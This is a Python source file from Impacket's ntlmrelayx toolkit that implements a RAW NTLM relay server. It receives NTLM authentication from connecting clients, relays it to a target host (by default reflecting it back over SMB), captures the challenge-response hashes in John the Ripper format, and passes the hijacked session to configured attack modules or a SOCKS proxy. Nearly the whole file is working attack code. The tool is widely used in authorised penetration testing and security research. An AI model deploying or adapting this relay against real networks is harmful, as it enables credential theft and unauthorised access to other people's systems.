# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   RAW Relay Server
#
#   Written for lsarelax, but the RAW server can be used by any third-party NTLM relay
#   server that would like to integrate with ntlmrelayx supported clients/attacks
#
# Authors:
#   Alberto Solino (@agsolino)
#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#   Ceri Coburn (@_EthicalChaos_)
#

import socketserver
import socket
import base64
import random
import struct
import string
from threading import Thread
from six import PY2

from impacket import ntlm, LOG
from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections


class RAWRelayServer(Thread):

    class RAWServer(socketserver.ThreadingMixIn, socketserver.TCPServer):

        def __init__(self, server_address, RequestHandlerClass, config):
            self.config = config
            self.daemon_threads = True
            #if self.config.ipv6:
            #    self.address_family = socket.AF_INET6

            socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)

    class RAWHandler(socketserver.BaseRequestHandler):

        def __init__(self, request, client_address, server):
            self.server = server
            self.challengeMessage = None
            self.target = None
            self.client = None
            self.machineAccount = None
            self.machineHashes = None
            self.domainIp = None
            self.authUser = None

            if self.server.config.target is None:
                # Reflection mode, defaults to SMB at the target, for now
                self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % client_address[0])
            self.target = self.server.config.target.getTarget()
            if self.target is None:
                LOG.info("RAW: Received connection from %s, but there are no more targets left!" % client_address[0])
                return

            LOG.info("RAW: Received connection from %s, attacking target %s://%s" % (client_address[0] ,self.target.scheme, self.target.netloc))

            super().__init__(request, client_address, server)

        def handle(self):

            ntlm_negotiate_len = struct.unpack('h', self.request.recv(2))
            ntlm_negotiate = self.request.recv(ntlm_negotiate_len[0])

            if not self.do_ntlm_negotiate(ntlm_negotiate):
                # Connection failed
                LOG.error('Negotiating NTLM with %s://%s failed. Skipping to next target',
                          self.target.scheme, self.target.netloc)
                self.server.config.target.logTarget(self.target)

            else:

                ntlm_chal_token = self.challengeMessage.getData()
                self.request.sendall(struct.pack('h', len(ntlm_chal_token)))
                self.request.sendall(ntlm_chal_token)

                ntlm_auth_len = struct.unpack('h', self.request.recv(2))
                ntlm_auth = self.request.recv(ntlm_auth_len[0])

                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                authenticateMessage.fromString(ntlm_auth)

                if not self.do_ntlm_auth(ntlm_auth, authenticateMessage):

                    self.request.sendall(struct.pack('h', 1))
                    self.request.sendall(struct.pack('?', False))

                    if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                        LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
                            self.target.scheme, self.target.netloc,
                            authenticateMessage['domain_name'].decode('utf-16le'),
                            authenticateMessage['user_name'].decode('utf-16le')))
                    else:
                        LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
                            self.target.scheme, self.target.netloc,
                            authenticateMessage['domain_name'].decode('ascii'),
                            authenticateMessage['user_name'].decode('ascii')))
                else:
                    # Relay worked, do whatever we want here...
                    self.request.sendall(struct.pack('h', 1))
                    self.request.sendall(struct.pack('?', True))

                    if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                        LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
                            self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
                            authenticateMessage['user_name'].decode('utf-16le')))
                    else:
                        LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
                            self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('ascii'),
                            authenticateMessage['user_name'].decode('ascii')))

                    ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
                                                        authenticateMessage['user_name'],
                                                        authenticateMessage['domain_name'],
                                                        authenticateMessage['lanman'], authenticateMessage['ntlm'])
                    self.client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

                    if self.server.config.outputFile is not None:
                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                              self.server.config.outputFile)

                    self.server.config.target.logTarget(self.target, True, self.authUser)

                    self.do_attack()

        def do_ntlm_negotiate(self, token):

            if self.target.scheme.upper() in self.server.config.protocolClients:
                self.client = self.server.config.protocolClients[self.target.scheme.upper()](self.server.config, self.target)
                # If connection failed, return
                if not self.client.initConnection():
                    return False
                self.challengeMessage = self.client.sendNegotiate(token)

                # Remove target NetBIOS field from the NTLMSSP_CHALLENGE
                if self.server.config.remove_target:
                    av_pairs = ntlm.AV_PAIRS(self.challengeMessage['TargetInfoFields'])
                    del av_pairs[ntlm.NTLMSSP_AV_HOSTNAME]
                    self.challengeMessage['TargetInfoFields'] = av_pairs.getData()
                    self.challengeMessage['TargetInfoFields_len'] = len(av_pairs.getData())
                    self.challengeMessage['TargetInfoFields_max_len'] = len(av_pairs.getData())

                # Check for errors
                if self.challengeMessage is False:
                    return False
            else:
                LOG.error('Protocol Client for %s not found!' % self.target.scheme.upper())
                return False

            return True

        def do_ntlm_auth(self, token, authenticateMessage):

            # For some attacks it is important to know the authenticated username, so we store it
            if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
                                            authenticateMessage['user_name'].decode('utf-16le'))).upper()
            else:
                self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('ascii'),
                                            authenticateMessage['user_name'].decode('ascii'))).upper()

            if authenticateMessage['user_name'] != '' or self.target.hostname == '127.0.0.1':
                clientResponse, errorCode = self.client.sendAuth(token)
            else:
                # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials, except
                # when coming from localhost
                errorCode = STATUS_ACCESS_DENIED

            if errorCode == STATUS_SUCCESS:
                return True

            return False

        def do_attack(self):
            # Check if SOCKS is enabled and if we support the target scheme
            if self.server.config.runSocks and self.target.scheme.upper() in self.server.config.socksServer.supportedSchemes:
                # Pass all the data to the socksplugins proxy
                activeConnections.put((self.target.hostname, self.client.targetPort, self.target.scheme.upper(),
                                       self.authUser, self.client, self.client.sessionData))
                return

            # If SOCKS is not enabled, or not supported for this scheme, fall back to "classic" attacks
            if self.target.scheme.upper() in self.server.config.attacks:
                # We have an attack.. go for it
                clientThread = self.server.config.attacks[self.target.scheme.upper()](self.server.config, self.client.session,
                                                                               self.authUser)
                clientThread.start()
            else:
                LOG.error('No attack configured for %s' % self.target.scheme.upper())

    def __init__(self, config):
        Thread.__init__(self)
        self.daemon = True
        self.config = config
        self.server = None

    def run(self):

        if self.config.listeningPort:
            rawport = self.config.listeningPort
        else:
            rawport = 6666
            
        LOG.info("Setting up RAW Server on port " + str(rawport))            

        # changed to read from the interfaceIP set in the configuration
        self.server = self.RAWServer((self.config.interfaceIp, rawport), self.RAWHandler, self.config)

        try:
             self.server.serve_forever()
        except KeyboardInterrupt:
             pass
        LOG.info('Shutting down RAW Server')
        self.server.server_close()